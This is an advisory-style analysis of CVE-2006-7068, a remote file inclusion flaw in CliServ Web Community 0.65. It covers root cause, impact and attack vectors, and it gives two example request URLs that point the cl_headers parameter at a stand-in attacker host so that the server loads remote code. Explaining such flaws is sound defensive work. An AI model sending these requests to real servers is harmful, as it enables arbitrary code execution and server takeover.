The provided content is related to CVE-2006-7068.

**Root cause of vulnerability:**
The vulnerability lies in the `menu.php3` and `login.php3` files of CliServ Web Community version 0.65. These files include external files specified by the `cl_headers` parameter without proper sanitization.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The application includes external files via the `include()` function based on user-controlled input (`cl_headers` parameter). This allows an attacker to include a malicious file from a remote server.

**Impact of exploitation:**
- **Arbitrary Code Execution:** An attacker can execute arbitrary code on the server by including a malicious PHP file from a remote server. This can lead to complete compromise of the application and potentially the server.

**Attack vectors:**
- **HTTP GET request:** The attacker sends a crafted HTTP GET request to either `menu.php3` or `login.php3` with the `cl_headers` parameter pointing to a malicious file on an attacker-controlled server.
- Example:
`http://www.site.com/[CliServ_path]/menu.php3?cl_headers=[http://www.myevilsite.com/evil_scripts.txt]`
`http://www.site.com/[CliServ_path]/login.php3?cl_headers=[http://www.myevilsite.com/evil_scripts.txt]`

**Required attacker capabilities/position:**
- The attacker needs to be able to send HTTP requests to the vulnerable web application.
- The attacker needs to host a malicious PHP file on a server accessible to the vulnerable application.
